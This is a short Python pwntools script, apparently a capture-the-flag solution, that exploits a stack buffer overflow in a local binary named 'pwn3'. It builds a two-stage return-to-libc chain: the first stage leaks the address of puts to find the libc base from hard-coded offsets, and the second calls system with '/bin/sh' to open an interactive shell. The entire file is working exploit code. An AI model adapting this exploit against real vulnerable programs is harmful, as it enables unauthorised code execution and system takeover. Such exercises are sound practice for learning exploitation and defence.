from pwn import *

def exploit():
    binary = ELF("./pwn3")
    p = process("./pwn3")
    padding = 140
    payload =  "A" * padding
    puts_plt = p32(binary.symbols["plt.puts"])
    laas = p32(binary.symbols["main"])
    gets_got = p32(binary.symbols["got.puts"])
    payload += puts_plt + laas + gets_got

    p.sendline(payload)
    print(p.recvuntil("Now give me some sweet desert: \n"))
    puts = u32(p.recv(4))
    log.info("Puts leak: {}".format(hex(puts)))
    offset_bin_sh = 0x15ba0b 
    offset_system = 0x03ada0
    offset_puts = 0x05fca0
    libc_base = puts - offset_puts

    system_addr = libc_base + offset_system
    fake_addr = 0xbeefdead
    bin_sh_addr = libc_base + offset_bin_sh


    buf = ""
    buf += "A"*132      #junk (in the second part of the exploration the payload had to be aligned. Obtained through debugger)
    buf += p32(system_addr)       #system into libc
    buf += p32(fake_addr)           #fake return address
    buf += p32(bin_sh_addr)       #/bin/sh into libc

    log.info("Stage 2: ...Obtaining Shell ")

    print ''

    p.sendline(buf)

    p.interactive()




if __name__ == "__main__":
	exploit()
